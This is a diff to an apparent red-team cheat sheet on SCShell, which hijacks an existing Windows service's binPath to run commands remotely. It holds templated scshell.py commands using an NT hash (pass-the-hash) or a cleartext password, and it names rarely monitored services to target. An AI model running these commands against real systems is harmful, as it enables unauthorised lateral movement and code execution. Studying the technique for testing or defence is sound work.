@@ -4,11 +4,9 @@ Stealthy alternative to psexec — reconfigures an existing service's binPath to
 
 ### Run command via service hijack
 
-Run command via service hijack with SCShell.
-
 Hijack `$service_name` (often `XblAuthManager` or `defragsvc` because they're start-on-demand and rarely monitored) to run `$cmd`.
 
-```sh title:"SCShell Run Command Via Service Hijack"
+```sh title:"SCShell Hijack existing service binPath to run arbitrary command"
 scshell.py -service-name $service_name -hashes :$nt_hash $domain/$user@$rhost_ip
 ```
 <!-- cheat
@@ -20,11 +18,9 @@ var nt_hash
 
 ### With password
 
-Dump SCShell with password.
-
 Same hijack flow but pass-by-password rather than NT hash.
 
-```sh title:"SCShell Dump with Password"
+```sh title:"SCShell service hijack with cleartext password"
 scshell.py -service-name $service_name $domain/$user:$pass@$rhost_ip
 ```
 <!-- cheat
